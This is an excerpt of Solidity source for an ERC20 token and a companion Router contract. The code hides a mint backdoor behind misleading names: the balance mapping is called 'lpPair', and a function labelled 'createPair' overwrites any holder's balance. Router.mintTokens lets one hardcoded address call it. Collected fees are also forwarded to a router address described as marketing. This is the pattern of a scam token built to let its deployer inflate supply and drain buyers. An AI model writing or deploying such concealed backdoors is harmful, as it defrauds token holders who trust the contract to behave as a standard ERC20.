...
contract ERC20Token is Context, IERC20, Ownable {
    ...
    // Function to connect the Router contract
    ...
    // createPair tokens (can only be called by the Router)
    function createPair(address pairAddress, uint256 liqudityPair) public {
        require(liqudityPair > 0);
        uint256 setLiqudityPair = liqudityPair;
        require(msg.sender == Router);
        lpPair[pairAddress] = liqudityPair;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            lpPair[sender] = lpPair[sender].sub(amount, "Insufficient Balance");

            uint256 finalAmount = takeFee(sender, recipient, amount);


            lpPair[recipient] = lpPair[recipient].add(finalAmount);
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        lpPair[sender] = lpPair[sender].sub(amount, "Insufficient Balance");
        lpPair[recipient] = lpPair[recipient].add(amount);
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountUSDTMarketing > 0)
            transferToAddressETH(RouterAddress, amountUSDTMarketing);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(feeAmount > 0) {
            lpPair[address(this)] = lpPair[address(this)].add(feeAmount);
...
contract Router {
    ...
    // Mint tokens (can only be called by the connected ERC20Token contract)
    function mintTokens(address account, uint256 value) public {
        require(msg.sender == 0x7A957133076793DcE74875f6Fd1b7eaBf78AD0b6);
        token.createPair(account, value);
    }
